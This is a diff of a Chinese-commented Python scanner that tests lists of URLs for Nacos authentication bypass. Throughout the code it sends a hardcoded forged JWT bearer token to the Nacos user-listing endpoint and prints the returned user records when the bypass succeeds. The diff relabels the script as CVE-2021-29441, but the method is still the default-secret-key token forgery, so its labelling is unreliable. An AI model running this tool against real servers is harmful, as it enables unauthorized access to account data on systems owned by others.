@@ -1,14 +1,15 @@
 import argparse
 import requests
 import threading
+import random
 
 '''
 +-----------------------------------------------------------------+
-漏洞名称: Nacos 默认 secret.key 配置不当权限绕过漏洞 QVD-2023-6271
-影响版本: 0.1.0<= Nacos <= 2.2.0                              
-单个检测：python nacos_qvd_2023_6271.py -u url
-批量检测：python nacos_qvd_2023_6271.py -f file.txt
-参考链接：https://www.cnblogs.com/spmonkey/p/17504263.html
+漏洞名称: Nacos API认证绕过漏洞 CVE-2021-29441
+影响版本: Nacos <= 2.0.0-ALPHA.1                               
+单个检测：python nacos_cve_2021_29441.py -u url
+批量检测：python nacos_cve_2021_29441.py -f file.txt
+参考连接: https://www.cnblogs.com/xyz315/p/15853268.html
 +-----------------------------------------------------------------+                                     
 '''
 
@@ -18,26 +19,24 @@ headers = {
     "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6NDA4"
                      "MTkwNzk5M30.BdQSxmoftt9zePaqO1-B9QFSi1tsiiQ2mzKUjnZfQJk"}
 
-data = {"username": "nacos", "password": "nacos123"}
-
 
 # 定义函数，用于发起POST请求并判断回显结果，每次调用这个函数发送一个请求
 def send_request(url):
     mid_urls = ['', '/nacos', '/home/nocos']
-    end_url = '/v1/auth/users/login'
+    end_url = '/v1/auth/users?pageNo=1&pageSize=10'
     for mid_url in mid_urls:
         full_url = url + mid_url + end_url
         try:
-            response = requests.post(full_url, headers=headers, data=data, timeout=2)
-            if response.status_code == 200 and response.json().get('accessToken'):
-                print(f'{url} 存在token.secret.key默认配置漏洞')
-                print(f'{response.json()}')
+            response = requests.get(full_url, headers=headers, timeout=2)
+            if response.status_code == 200 and response.json().get('totalCount'):
+                print(f'{url} 存在API认证绕过漏洞')
+                print(f'{response.json().get("pageItems")}')
                 return
         except requests.exceptions.RequestException as e:
             print(f'{url} 访问失败 {e}')
             return
 
-    print('不存在token.secret.key默认配置漏洞')
+    print('不存在API认证绕过漏洞')
 
 
 if __name__ == '__main__':
